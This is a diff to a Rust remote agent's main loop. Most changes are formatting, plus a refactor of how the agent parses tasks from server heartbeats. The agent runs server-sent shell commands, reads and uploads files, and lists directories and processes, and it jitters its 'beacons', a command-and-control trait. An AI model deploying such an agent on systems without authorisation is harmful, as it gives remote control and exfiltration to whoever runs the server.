@@ -1,5 +1,8 @@
 use crate::config::AgentConfig;
-use crate::protocol::{AgentRegistration, HeartbeatRequest, TaskMessage, TaskResult, TelemetryPayload, TransportStatus};
+use crate::protocol::{
+    AgentRegistration, HeartbeatRequest, HeartbeatResponse, TaskMessage, TaskResult,
+    TelemetryPayload, TransportStatus,
+};
 use crate::state::AgentState;
 use crate::transport::https::HttpsTransport;
 use anyhow::Context;
@@ -94,7 +97,10 @@ pub async fn run() -> anyhow::Result<()> {
             state.save()?;
             info!("received agent token: {}", token);
         } else {
-            return Err(anyhow::anyhow!("register response missing token: {:?}", body));
+            return Err(anyhow::anyhow!(
+                "register response missing token: {:?}",
+                body
+            ));
         }
     }
 
@@ -140,18 +146,25 @@ pub async fn run() -> anyhow::Result<()> {
                 transport_status.last_attempt_at = Some(chrono::Utc::now().to_rfc3339());
                 info!("heartbeat successful (retries={})", res.retries);
 
-                let body = res.body;
-
-                if let Ok(resp) = serde_json::from_slice::<serde_json::Value>(&body) {
-                    if let Some(tasks) = resp.get("tasks") {
-                        if let Ok(tasks) = serde_json::from_value::<Vec<TaskMessage>>(tasks.clone()) {
-                            for task in tasks {
-                                let result = execute_task(&state, task).await;
-                                if let Err(e) = submit_task_result(&transport, &cfg, &result).await {
-                                    error!("failed to submit task result: {}", e);
-                                }
+                match serde_json::from_slice::<HeartbeatResponse>(&res.body) {
+                    Ok(resp) => {
+                        if !resp.tasks.is_empty() {
+                            info!("received {} task(s)", resp.tasks.len());
+                        }
+                        for task in resp.tasks {
+                            info!(
+                                "executing task {}: {} {:?}",
+                                task.task_id, task.command, task.args
+                            );
+                            let result = execute_task(&state, task).await;
+                            if let Err(e) = submit_task_result(&transport, &cfg, &result).await {
+                                error!("failed to submit task result: {}", e);
                             }
                         }
+                    }
+                    Err(e) => {
+                        let snippet = String::from_utf8_lossy(&res.body);
+                        error!("failed to decode heartbeat response: {e}; body={}", snippet);
                     }
                 }
             }
@@ -164,7 +177,10 @@ pub async fn run() -> anyhow::Result<()> {
             }
         }
 
-        let jitter = rand::thread_rng().gen_range(0..cfg.heartbeat_interval);
+        // Keep some jitter to avoid perfectly periodic beacons, but don't double
+        // the interval in development (0..interval adds up to 2x delay).
+        let max_jitter = std::cmp::min(5, std::cmp::max(1, (cfg.heartbeat_interval / 4) as u64));
+        let jitter = rand::thread_rng().gen_range(0..=max_jitter);
         let delay = Duration::from_secs(cfg.heartbeat_interval + jitter);
         tokio::time::sleep(delay).await;
     }
@@ -202,9 +218,7 @@ async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
                     Ok(_) => build_result("success", "uploaded".to_string(), None),
                     Err(e) => build_result("error", "".to_string(), Some(e.to_string())),
                 },
-                Err(e) => {
-                    build_result("error", "".to_string(), Some(e.to_string()))
-                }
+                Err(e) => build_result("error", "".to_string(), Some(e.to_string())),
             }
         }
         "download" => {
@@ -218,7 +232,9 @@ async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
 
             let path = Path::new(&task.args[0]);
             match fs::read(path) {
-                Ok(bytes) => build_result("success", general_purpose::STANDARD.encode(&bytes), None),
+                Ok(bytes) => {
+                    build_result("success", general_purpose::STANDARD.encode(&bytes), None)
+                }
                 Err(e) => build_result("error", "".to_string(), Some(e.to_string())),
             }
         }
@@ -244,8 +260,11 @@ async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
                         } else {
                             "file"
                         };
-                        lines.push(format!("{} {}
-", kind, name));
+                        lines.push(format!(
+                            "{} {}
+",
+                            kind, name
+                        ));
                         if lines.len() >= 200 {
                             lines.push("...truncated...\n".to_string());
                             break;
@@ -261,11 +280,7 @@ async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
             sys.refresh_processes(ProcessesToUpdate::All, true);
             let mut lines = Vec::new();
             for (pid, process) in sys.processes() {
-                lines.push(format!(
-                    "{}\t{}\n",
-                    pid,
-                    process.name().to_string_lossy(),
-                ));
+                lines.push(format!("{}\t{}\n", pid, process.name().to_string_lossy(),));
             }
             build_result("success", lines.join(""), None)
         }
@@ -290,7 +305,11 @@ async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
                     return build_result("error", "".to_string(), Some(e.to_string()));
                 }
                 Err(_) => {
-                    return build_result("timeout", "".to_string(), Some("task timed out".to_string()));
+                    return build_result(
+                        "timeout",
+                        "".to_string(),
+                        Some("task timed out".to_string()),
+                    );
                 }
             };
 
@@ -304,18 +323,34 @@ async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
                 shell.arg(full);
                 match timeout(deadline, shell.output()).await {
                     Ok(Ok(output)) => output,
-                    Ok(Err(e)) => return build_result("error", "".to_string(), Some(e.to_string())),
-                    Err(_) => return build_result("timeout", "".to_string(), Some("task timed out".to_string())),
+                    Ok(Err(e)) => {
+                        return build_result("error", "".to_string(), Some(e.to_string()))
+                    }
+                    Err(_) => {
+                        return build_result(
+                            "timeout",
+                            "".to_string(),
+                            Some("task timed out".to_string()),
+                        )
+                    }
                 }
             };
 
             let output_text = String::from_utf8_lossy(&output.stdout).to_string();
             let error_text = String::from_utf8_lossy(&output.stderr).to_string();
-            let status_str = if output.status.success() { "success" } else { "error" };
+            let status_str = if output.status.success() {
+                "success"
+            } else {
+                "error"
+            };
             build_result(
                 status_str,
                 output_text,
-                if error_text.is_empty() { None } else { Some(error_text) },
+                if error_text.is_empty() {
+                    None
+                } else {
+                    Some(error_text)
+                },
             )
         }
     }
@@ -364,7 +399,10 @@ mod tests {
 
         // Ensure cwd is a valid path.
         if let Some(cwd) = metadata.get("cwd") {
-            assert!(Path::new(cwd).exists(), "cwd value should point to an existing directory");
+            assert!(
+                Path::new(cwd).exists(),
+                "cwd value should point to an existing directory"
+            );
         }
     }
 }
